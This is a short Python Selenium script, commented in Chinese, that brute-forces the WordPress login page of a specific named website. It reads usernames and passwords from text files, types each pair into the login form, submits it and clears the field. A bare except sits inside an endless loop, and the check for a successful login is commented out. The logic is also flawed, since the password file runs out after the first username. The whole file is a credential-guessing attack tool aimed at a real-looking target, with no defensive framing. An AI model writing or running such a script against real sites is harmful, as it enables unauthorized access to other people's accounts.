#!/usr/bin/python3
# -*- coding: UTF-8 -*-
import time
from selenium import webdriver
browser = webdriver.Chrome()
#设置浏览器窗口
browser.set_window_size(1080,800)
# 打开网址
browser.get('http://www.hqjs.xyz/wp-login.php?redirect_to=http%3A%2F%2Fwww.hqjs.xyz%2Fwp-admin%2Fedit.php&reauth=1')
# 定位元素输入
while True:
    try:
         u = open('username.txt','r',encoding='utf-8')
         f = open('password.txt','r',encoding='utf-8')
         for username in u:
            for password in f:
                username = username.strip()
                password = password.strip()
                inputFirst = browser.find_element_by_id('user_login').send_keys(username)
                inputFirst = browser.find_element_by_id('user_pass').send_keys(password)
                # 定位元素点击
                inputFirst = browser.find_element_by_id('wp-submit').click()
                time.sleep(1)
                inputFirst = browser.find_element_by_id('user_login').clear()
                #登陆成功标志
                #suCess = browser.find_element_by_id("login_error")
                #print(suCess.text)
                # 睡眠设置
    except:
        pass




